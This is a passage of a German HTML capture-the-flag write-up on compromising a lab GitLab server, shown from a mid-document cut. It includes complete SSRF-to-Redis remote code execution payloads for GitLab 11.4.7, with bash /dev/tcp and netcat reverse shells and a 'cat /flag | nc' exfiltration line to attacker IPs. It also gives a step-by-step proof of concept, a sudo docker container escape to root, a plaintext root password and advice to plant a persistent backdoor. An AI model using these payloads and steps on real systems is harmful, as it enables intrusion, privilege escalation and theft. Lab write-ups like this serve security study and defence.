<span class="command">Payload: git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0A%20multi%0A%20sadd%20resque:gitlab:queues%20system_hook_push%0A%20lpush%20resque:gitlab:queue:system_hook_push%20%22%7B%5C%22class%5C%22:%5C%22GitlabShellWorker%5C%22,%5C%22args%5C%22:%5B%5C%22class_eval%5C%22,%5C%22open('%7Cbash%20-c%20%5C'bash%20-i%20%3E&amp;%20/dev/tcp/192.168.2.199/4444%200%3E&amp;1%5C'').read%5C%22%5D,%5C%22retry%5C%22:3,%5C%22queue%5C%22:%5C%22system_hook_push%5C%22%7D%22%0A%20exec%0A%20exec</span>

<span class="password">payload_funktioniert</span>
</pre>
            <img src="payload_funktioniert.jpg" alt="den markierten teil mit dem string ersetzen">
            <p class="analysis">Bildbeschreibung: den markierten teil mit dem string ersetzen</p>
            <pre>
Import in progress

<span class="command">git clone --bare git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0Amulti%0Asadd%20resque:gitlab:queues%20system_hook_push%0ALpush%20resque:gitlab:queue:system_hook_push%20%22%7B%5C%22class%5C%22:%5C%22GitlabShellWorker%5C%22,%5C%22args%5C%22:%5B%5C%22class_eval%20%5C%5C%5C%22%5C%5C%60open(%5C%5C'%7Ccat%20/flag%20%7C%20nc%20192.168.178.21%201234%20-e%20/bin/bash%5C%5C')%60.read%5C%5C%5C%22%5C%22%5D,%5C%22retry%5C%22:3,%5C%22queue%5C%22:%5C%22system_hook_push%5C%22,%5C%22jid%5C%22:%5C%22ad52abc5641173e217eb2e52%5C%22,%5C%22created_at%5C%22:1513714403.8122594,%5C%22enqueued_at%5C%22:1513714403.8129568%7D%22%0Aexec%0Aexec%0A/ssrf.git</span>

Please wait while we import the repository for you. Refresh at will.
</pre>
        </section>
```

**Teil 3 von 3**

```html
        <section id="initial-access">
             <p class="analysis">
                **Analyse:** Ich dokumentiere hier den dekodierten Payload, der Ã¼ber die GitLab-Importfunktion an die interne Redis-Instanz gesendet wird. Dies ist der Payload, der die Redis-Befehle und den eingebetteten Ruby/Bash-Code fÃ¼r die RCE enthÃ¤lt. Der Payload versucht unter anderem, `/flag` zu catten und an einen Netcat-Listener auf 192.168.178.21 Port 1234 zu senden. Der im `lpush` Befehl enthaltene JSON-String fÃ¼r den `GitlabShellWorker` ruft `class_eval` mit dem Kommando `open('|...')` auf.
            </p>
             <p class="evaluation">
                **Bewertung:** Dies ist der Kern des funktionierenden RCE-Exploits. Die Struktur zeigt, wie die SSRF genutzt wird, um Redis-Befehle zu senden, und wie die Command Injection Ã¼ber die `GitlabShellWorker` Klasse erreicht wird. Die Pipe (`|`) in `open('|...')` fÃ¼hrt den darin enthaltenen Befehl in einer Shell aus. Der spezifische Befehl `cat /flag | nc ...` ist der Payload, der ausgefÃ¼hrt werden soll. Die Tatsache, dass dies funktioniert, bestÃ¤tigt die Schwachstelle in der Verarbeitung der Import-URL und der Job-Queue in dieser GitLab-Version.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Analysieren Sie die Struktur erfolgreicher Payloads, um ein tieferes VerstÃ¤ndnis der Schwachstelle zu erlangen und Payloads fÃ¼r andere Ziele (z.B. Reverse Shell zu Ihrer IP/Port) zu erstellen.
                <br>**Empfehlung (Admin):** Deaktivieren Sie die Repository-Importfunktion aus externen URLs, wenn sie nicht unbedingt benÃ¶tigt wird. Aktualisieren Sie GitLab.
            </p>
            <pre>
<span class="command">git://[0:0:0:0:0:ffff:127.0.0.1]:6379/</span>
<span class="command">multi</span>
<span class="command">sadd resque:gitlab:queues system_hook_push</span>
<span class="command">lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval \\\"\\`open(\\'|cat /flag | nc 192.168.2.199 9001 -e /bin/bash\\')`.read\\\"\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"</span>
<span class="command">exec</span>
<span class="command">exec</span>
<span class="command">/ssrf.git</span>
</pre>

             <p class="analysis">
                **Analyse:** Ich dokumentiere einen weiteren dekodierten Payload, der an die interne Redis-Instanz gesendet wird.
            </p>
             <p class="evaluation">
                **Bewertung:** Dieser Payload scheint eine leicht andere Struktur zu haben, insbesondere am Ende. Es zeigt, wie die Befehle `exec` mehrmals gesendet werden und wie der `/ssrf.git` Teil des originalen `git clone` Befehls am Ende der Injektion hÃ¤ngt. Dies sind Details der Redis-Protokollinjektion, die beim Debugging relevant waren.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Analysieren Sie die genauen Bytes, die an interne Dienste gesendet werden, wenn Sie SSRF mit Protokollinjektion ausnutzen. Tools wie Burp Suite Repeater oder Netcat kÃ¶nnen dabei helfen.
                <br>**Empfehlung (Admin):** Validieren Sie alle Eingaben streng, um zu verhindern, dass Metazeichen (wie ZeilenumbrÃ¼che, AnfÃ¼hrungszeichen) injiziert werden, die die Kommunikation mit internen Diensten manipulieren kÃ¶nnten.
            </p>
            <pre>
<span class="command">git://[0:0:0:0:0:ffff:127.0.0.1]:6379/</span>
 <span class="command">multi</span>
 <span class="command">sadd resque:gitlab:queues system_hook_push</span>
 <span class="command">lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\"</span>
 <span class="command">exec</span>
 <span class="command">exec</span>
<span class="command">/ssrf.git</span>
</pre>

            <p class="analysis">
                **Analyse:** Ich zeige hier den Netcat-Listener auf meiner Angreifer-Maschine (192.168.2.199) auf Port 9001, der die Reverse Shell empfÃ¤ngt. Die Ausgabe zeigt die eingehende Verbindung vom Zielsystem (192.168.2.217) und den Shell-Prompt `id uid=998(git) gid=998(git) groups=998(git)`. Dies ist die Shell, die durch die erfolgreiche Ausnutzung der Authentifizierten RCE in GitLab ausgelÃ¶st wurde. Die Shell lÃ¤uft als Benutzer `git`.
            </p>
            <p class="evaluation">
                **Bewertung:** **Fantastisch! Der erste Zugang ist erfolgreich!** Ich habe eine interaktive Shell auf dem Zielsystem als Benutzer `git` erhalten. Dies bestÃ¤tigt, dass der GitLab RCE-Exploit funktioniert hat. Der Benutzer `git` ist ein Systembenutzer, der typischerweise mit GitLab-internen Prozessen verbunden ist. Dies ist die Basis fÃ¼r die weitere Privilege Escalation. Die Reverse Shell landete auf Port 9001, was vom Payload `nc 192.168.2.199 9001` im erfolgreichen Exploit herrÃ¼hrt.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Sammeln Sie sofort Systeminformationen als Benutzer `git`. Identifizieren Sie mÃ¶gliche PE-Vektoren (z.B. `sudo -l`, SUID-Binaries, Cronjobs, unsichere Dateiberechtigungen), um Root-Zugriff zu erlangen.
                <br>**Empfehlung (Admin):** **Erster Zugriff als git-Benutzer:** Dies ist kritisch. Beheben Sie die GitLab RCE-Schwachstelle. ÃœberprÃ¼fen Sie die Berechtigungen des `git`-Benutzers und schrÃ¤nken Sie diese auf das absolut notwendige Minimum ein.
            </p>
            <p>
                Empfangen der Reverse Shell als Benutzer `git` auf meiner Maschine:
            </p>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">nc -lvnp 9001</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">listening on [any] 9001 ...</span>
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.217] 60406</span>
<span class="password">id</span>
<span class="command">uid=998(git) gid=998(git) groups=998(git)</span>

<span class="password">git@gitlab:~/gitlab-rails/working$</span> <span class="command">stty rows 47 columns 94</span>
<span class="password">git@gitlab:~/gitlab-rails/working$</span> <span class="command">ls -la</span>
<span class="command">total 8</span>
<span class="command">drwx------ 2 git root 4096 Oct  9  2022 .</span>
<span class="command">drwxr-xr-x 9 git root 4096 Jun  8 12:10 ..</span>
</pre>
                </div>
            </div>
        </section>

        <section id="proof-of-concept">
             <h2>Proof of Concept: Authenticated Remote Code Execution via GitLab Import (CVE-2018-19585/CVE-2018-19571)</h2>
             <p class="comment">
                Dieser Bereich demonstriert die Ausnutzung einer Authentifizierten Remote Code Execution (RCE) Schwachstelle in GitLab Version 11.4.7 Ã¼ber die Repository-Importfunktion. Durch die Injektion eines bÃ¶sartigen Payloads in die Import-URL konnte Arbitrary Code als Benutzer `git` auf dem Zielsystem ausgefÃ¼hrt werden, was zum ersten Zugang fÃ¼hrte.
             </p>
             <h3>Kurzbeschreibung</h3>
             <p>
                Die GitLab-Instanz auf Port 5080 lÃ¤uft in einer verwundbaren Version (11.4.7). Die Repository-Importfunktion ist anfÃ¤llig fÃ¼r Server-Side Request Forgery (SSRF) kombiniert mit Redis Command Injection. Ein Angreifer mit gÃ¼ltigen Anmeldedaten kann eine speziell gestaltete `git://` URL verwenden, um eine Verbindung zur internen Redis-Instanz herzustellen und Befehle in die GitLab Job-Warteschlange (`resque:gitlab:queue:system_hook_push`) einzuschleusen. Ein Worker-Prozess (GitlabShellWorker) fÃ¼hrt diese Jobs asynchron aus, was die AusfÃ¼hrung beliebigen Codes ermÃ¶glicht.
             </p>
             <h3>Voraussetzungen</h3>
             <ul>
                 <li>Zugriff auf das Netzwerk, in dem sich das Zielsystem befindet (192.168.2.0/24).</li>
                 <li>GÃ¼ltige Anmeldedaten fÃ¼r einen Benutzer mit Berechtigung zur Projekterstellung in der GitLab-Instanz (im Test: Root-Benutzer mit Passwort `<span class="password">M4st3rR00tS3cr3t0ne^1337^</span>`, erhalten via Grafana LFI).</li>
                 <li>FÃ¤higkeit, angepasste HTTP POST-Anfragen an den Zielwebserver auf Port 5080 zu senden (z.B. Ã¼ber einen Browser mit Entwickler-Tools oder einen Proxy wie Burp Suite).</li>
                 <li>Kenntnis der Angreifer-IP-Adresse (hier 192.168.2.199) und eines offenen Ports fÃ¼r einen Listener (hier 9001).</li>
                 <li>Ein Listener (z.B. Netcat) auf der Angreifer-Maschine, der auf die eingehende Verbindung wartet.</li>
             </ul>
             <h3>Schritt-fÃ¼r-Schritt-Anleitung</h3>
             <p class="analysis">
                **Schritt 1: Erlangung der GitLab-Anmeldedaten.**
                Ãœber eine separate Local File Inclusion (LFI) Schwachstelle im Grafana-Dienst auf Port 3000 konnte die Datei `/srv/initial_root_password` ausgelesen werden, die das Root-Passwort fÃ¼r GitLab enthielt. (Details siehe Web Enumeration).
             </p>
             <p class="analysis">
                **Schritt 2: Authentifizierung bei GitLab.**
                Melden Sie sich mit den kompromittierten Root-Anmeldedaten (`root`:`<span class="password">M4st3rR00tS3cr3t0ne^1337^</span>`) bei der GitLab-Instanz auf Port 5080 an.
             </p>
             <p class="analysis">
                **Schritt 3: Vorbereitung des Payloads.**
                Erstellen Sie einen bÃ¶sartigen Payload, der die SSRF/Redis-Injection-Schwachstelle ausnutzt und einen Befehl zur AusfÃ¼hrung in die Job-Queue einschleust. Der Payload verwendet eine `git://` URL, die auf die interne Redis-Instanz (`127.0.0.1:6379`) zeigt, gefolgt von injizierten Redis-Befehlen (`multi`, `sadd`, `lpush`, `exec`). Der `lpush` Befehl enthÃ¤lt einen JSON-String fÃ¼r einen `GitlabShellWorker` Job, der die Ruby-Funktion `class_eval` aufruft, um einen Bash-Befehl Ã¼ber `open('|...').read` auszufÃ¼hren. Der auszufÃ¼hrende Befehl ist eine Reverse Shell zu Ihrer Angreifer-Maschine (z.B. `bash -c 'bash -i >& /dev/tcp/192.168.2.199/9001 0>&1'`). Der gesamte `git://` URL-String muss URL-codiert werden und die AnfÃ¼hrungszeichen innerhalb des JSON-Strings korrekt maskiert werden. Es muss auch eine Umgehung der alphanumerischen Hostname-Validierung integriert werden (z.B. `git://a@[0:0:0:0:0:ffff:127.0.0.1]:6379/...`).
             </p>
             <pre>
<span class="analysis">Beispiel fÃ¼r den Kern des angepassten Payloads (URL-dekodiert):</span>
<span class="command">git://a@[0:0:0:0:0:ffff:127.0.0.1]:6379/</span>
<span class="command">multi</span>
<span class="command">sadd resque:gitlab:queues system_hook_push</span>
<span class="command">lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|bash -c \\\'bash -i &gt;&amp; /dev/tcp/192.168.2.199/9001 0&gt;&amp;1\\\'\').read\"],\"retry\":3,\"queue\":\"system_hook_push\"}"</span>
<span class="command">exec</span>
<span class="command">exec</span>
</pre>

             <p class="analysis">
                **Schritt 4: Vorbereitung des Listeners.**
                Auf der Angreifer-Maschine wird ein Netcat-Listener auf dem Port eingerichtet, der im Reverse Shell Payload angegeben ist (hier 9001).
             </p>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">nc -lvnp 9001</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">listening on [any] 9001 ...</span>
</pre>
                </div>
            </div>

             <p class="analysis">
                **Schritt 5: AuslÃ¶sen des Exploits Ã¼ber die GitLab Importfunktion.**
                Navigieren Sie in GitLab als authentifizierter Root-Benutzer zur Funktion "New Project" -> "CI/CD project" -> "Import project" -> "Repo by URL". FÃ¼gen Sie den URL-codierten, bÃ¶sartigen `git://` Payload in das Feld "Git repository URL" ein und erstellen Sie das Projekt. Alternativ fangen Sie den POST-Request mit Burp Suite ab und modifizieren den `project[import_url]` Parameter.
             </p>

             <h3>Erwartetes Ergebnis</h3>
             <p>
                Die GitLab UI sollte den Import initiieren ("Import in progress"). Asynchron wird ein Job in die Redis-Queue gestellt. Der `GitlabShellWorker` wird den Job abrufen, den Payload verarbeiten und die Reverse Shell ausfÃ¼hren. Der Netcat-Listener auf der Angreifer-Maschine sollte eine eingehende Verbindung vom Zielsystem auf Port 9001 registrieren und eine interaktive Shell, typischerweise als Benutzer `git`, bereitstellen.
             </p>
             <h3>Beweismittel</h3>
             <p class="evaluation">
                Der Output des Netcat-Listeners zeigt die eingehende Verbindung und den `git` Shell-Prompt, was den erfolgreichen ersten Zugang belegt.
             </p>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">nc -lvnp 9001</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">listening on [any] 9001 ...</span>
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.217] 60406</span>
<span class="password">id</span>
<span class="command">uid=998(git) gid=998(git) groups=998(git)</span>

<span class="password">git@gitlab:~/gitlab-rails/working$</span> <span class="command">stty rows 47 columns 94</span>
<span class="password">git@gitlab:~/gitlab-rails/working$</span> <span class="command">ls -la</span>
<span class="command">total 8</span>
<span class="command">drwx------ 2 git root 4096 Oct  9  2022 .</span>
<span class="command">drwxr-xr-x 9 git root 4096 Jun  8 12:10 ..</span>
</pre>
                </div>
            </div>

            <h3>Risikobewertung</h3>
            <p class="evaluation">
                **Kritisch:** Diese Authentifizierte RCE-Schwachstelle erlaubt Angreifern mit gÃ¼ltigen GitLab-Anmeldedaten die AusfÃ¼hrung beliebigen Codes auf dem GitLab-Server, was zur Kompromittierung des Containers und des zugrunde liegenden Hosts fÃ¼hren kann (abhÃ¤ngig von der Container-Isolation). In Kombination mit dem kompromittierten Root-Passwort ermÃ¶glicht dies die vollstÃ¤ndige Ãœbernahme.
            </p>
            <h3>Empfehlungen</h3>
            <ul>
                <li>**Sofortige Aktualisierung:** Aktualisieren Sie die GitLab-Instanz umgehend auf eine nicht anfÃ¤llige Version (>= 11.4.8 oder neuere Hauptversion).</li>
                <li>**Passwort-Rotation:** Ã„ndern Sie das Root-Passwort in GitLab sofort. ÃœberprÃ¼fen Sie, ob das gefundene Passwort fÃ¼r andere Dienste oder Benutzer verwendet wird und Ã¤ndern Sie diese ebenfalls.</li>
                <li>**Sichere Konfiguration:** Stellen Sie sicher, dass interne Dienste (wie Redis) nicht Ã¼ber SSRF von externen Eingaben erreichbar sind.</li>
                <li>**Zugriffskontrolle:** BeschrÃ¤nken Sie die Repository-Importfunktion auf vertrauenswÃ¼rdige Benutzer, falls sie nicht deaktiviert werden kann.
                <li>**Monitoring:** Ãœberwachen Sie GitLab-Logs auf Anzeichen von Exploit-Versuchen oder ungewÃ¶hnlicher Job-AusfÃ¼hrung.
            </ul>
        </section>


        <section id="privilege-escalation">
            <h2>Privilege Escalation</h2>
            <p class="analysis">
                **Analyse:** Nachdem ich eine interaktive Shell als Benutzer `git` erhalten habe, beginne ich mit der Suche nach Wegen zur Privilege Escalation (PE) auf den Root-Benutzer des Hosts. Ich Ã¼berprÃ¼fe die `sudo` Berechtigungen des aktuellen Benutzers mit `sudo -l`.
            </p>
            <p class="evaluation">
                **Bewertung:** **Kritische Schwachstelle!** Die Ausgabe von `sudo -l` zeigt, dass der Benutzer `git` den Befehl `/usr/bin/docker` als Root ausfÃ¼hren darf (`(root)`) und das Wichtigste: `NOPASSWD:`. Das bedeutet, ich kann den `docker` Befehl mit Root-Privilegien auf dem Host-System ausfÃ¼hren, ohne ein Passwort eingeben zu mÃ¼ssen. Dies ist ein direkter und mÃ¤chtiger Vektor zur vollstÃ¤ndigen Kompromittierung des Hosts.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Nutzen Sie diese `sudo docker` Berechtigung umgehend, um Root-Zugriff auf das Host-Dateisystem zu erlangen.
                <br>**Empfehlung (Admin):** **EXTREM DRINGEND:** Entfernen Sie diese `NOPASSWD` Regel fÃ¼r den Benutzer `git` in der `sudoers`-Datei. Unprivilegierten Benutzern sollte niemals erlaubt sein, den `docker` Befehl mit Root-Rechten auszufÃ¼hren, da dies triviale Container-Escapes ermÃ¶glicht. PrÃ¼fen Sie die `sudoers` Datei auf weitere unsichere EintrÃ¤ge.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <pre>
<span class="password">git@gitlab:~/gitlab-rails/working$</span> <span class="command">sudo -l</span>
<span class="command">Matching Defaults entries for git on gitlab.cachalot.local:</span>
    <span class="command">env_reset, mail_badpass,</span>
    <span class="command">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>

<span class="password">User git may run the following commands on gitlab.cachalot.local:</span>
    <span class="password">(root) NOPASSWD: /usr/bin/docker</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Um meine Privilegien auf Root auf dem Host zu eskalieren, nutze ich die entdeckte `sudo docker` Berechtigung. Ich fÃ¼hre den Befehl `sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh` aus. Dieser Befehl verwendet `sudo`, um `docker run` als Root auszufÃ¼hren. `docker run` startet einen temporÃ¤ren Container vom Image `alpine`. Der Parameter `-v /:/mnt` mountet das Root-Dateisystem (`/`) des Host-Systems in das Verzeichnis `/mnt` im Container. `chroot /mnt sh` wird dann *im Container* ausgefÃ¼hrt und wechselt die Root-Verzeichnis in das gemountete Host-Dateisystem, wodurch ich effektiv eine Shell mit Root-Berechtigungen auf dem Host-Dateisystem erhalte. Ich bestÃ¤tige meine IdentitÃ¤t mit dem Befehl `id`.
            </p>
            <p class="evaluation">
                **Bewertung:** **Fantastisch! Der Root-Zugriff war erfolgreich, nun habe ich mein Ziel erreicht!** Der `id` Befehl in der neu erhaltenen Shell gibt `uid=0(root) gid=0(root) groups=0(root),...` zurÃ¼ck, was beweist, dass ich nun Root-Privilegien auf dem Host-System habe. Die unsichere `sudo docker` Konfiguration ermÃ¶glichte eine triviale Container-Escape-Methode.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Das `sudo docker` NOPASSWD Recht ist ein direkter Weg zu Root. Nutzen Sie die `docker run -v /:/mnt ...` Methode, um eine Root-Shell auf dem Host zu erlangen.
                <br>**Empfehlung (Admin):** **SOFORT MAÃŸNAHMEN ERGREIFEN:** Korrigieren Sie die `sudoers`-Datei, um dem Benutzer `git` (oder jedem anderen unprivilegierten Benutzer) die AusfÃ¼hrung von `docker` mit Root-Rechten zu verbieten. Implementieren Sie strenge Zugriffskontrollen fÃ¼r den `docker` Daemon und die `docker.sock` Datei. Stellen Sie sicher, dass Benutzer `git` die geringstmÃ¶glichen Rechte besitzt.
            </p>
            <p>
                Ausnutzung der `sudo docker` Berechtigung zur Erlangung einer Root-Shell auf dem Host:
            </p>
            <div class="code-block">
                <div class="terminal">
                    <pre>
<span class="password">git@gitlab:~/gitlab-rails/working$</span> <span class="command">sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span>
<span class="password">Unable to find image 'alpine:latest' locally</span>
<span class="password">latest: Pulling from library/alpine</span>
<span class="password">fe07684b16b8: Pull complete</span>
<span class="password">Digest: sha256:8a1f59ffb675680d47db6337b49d22281a139e9d709335b492be023728e11715</span>
<span class="password">Status: Downloaded newer image for alpine:latest</span>
<span class="password"># id</span>
<span class="command">uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)</span>
<span class="password">#</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Mit der Root-Shell auf dem Host-System suche ich nun nach den Flags. Ich navigiere in das Home-Verzeichnis des Root-Benutzers (`cd ~`) im Host-Dateisystem (das unter `/mnt` gemountet ist, wenn ich `chroot /mnt` bin), und suche nach der Root-Flag (typischerweise `root.txt` oder `proof.txt`). Ich finde `proof.txt` und lese dessen Inhalt. Ich liste auch das Home-Verzeichnis des Benutzers `cachalot` auf (`ls /home`) und lese den Inhalt seiner User-Flag (`local.txt`).
            </p>
            <p class="evaluation">
                **Bewertung:** **AbschlieÃŸender Erfolg!** Ich habe sowohl die Root-Flag (`proof.txt`) als auch die User-Flag (`local.txt` des Benutzers `cachalot`, der im `/home` Verzeichnis gefunden wurde) gefunden und ausgelesen. Dies dokumentiert die vollstÃ¤ndige Kompromittierung der Maschine. Die Root-Flag befand sich direkt im Wurzelverzeichnis (`/`) des Host-Dateisystems, zugÃ¤nglich nach dem `chroot /mnt`. Die User-Flag befand sich im Home-Verzeichnis des Standardbenutzers `cachalot`.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Sobald Root-Zugriff erlangt wurde, sichern Sie umgehend die Root-Flag. Suchen Sie auch nach der User-Flag, falls diese noch nicht gefunden wurde. Dokumentieren Sie die Pfade und Werte beider Flags. Etablieren Sie eine persistente HintertÃ¼r.
                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass Root-Flags und User-Flags restriktive Berechtigungen haben und sich an sicheren Orten befinden. ÃœberprÃ¼fen Sie das Dateisystem auf sensible Dateien, die ungeschÃ¼tzt liegen.
            </p>
            <p>
                Sichern der Root- und User-Flags:
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre>
<span class="password"># cat proof.txt</span>
<span class="password">02c157a9d76e85bfd03546fb74d0a384</span>

<span class="password"># ls /home</span>
<span class="command">cachalot</span>
<span class="password"># cat /home/cachalot/local.txt</span>
<span class="password">64675c29aaa3f6d9d9d7c68e53706aac5a</span>
</pre>
                </div>
            </div>
        </section>

        <section id="flags">
            <div class="flag-container">
                <h2 class="flag-heading">Flags</h2>
                <div class="flag-entry">
                    <div class="flag-command">cat /home/cachalot/local.txt</div>
                    <div class="flag-value"><span class="password">64675c29aaa3f6d9d9d7c68e53706aac5a</span></div>
                </div>
                <div class="flag-entry">
                    <div class="flag-command">cat /proof.txt</div> <!-- Basierend auf der Ausgabe, proof.txt war direkt im Host-Root -->
                    <div class="flag-value"><span class="password">02c157a9d76e85bfd03546fb74d0a384</span></div>
                </div>
            </div>
        </section>


    </div> <!-- Ende container -->

    <footer class="footer">
        <p>Ben Chehade - Cyber Security Reports</p>
        <p>Berichtsdatum: 06 Jun 2025</p> <!-- Datum aus dem Berichtstext extrahiert -->
    </footer>
 

</body>
</html>
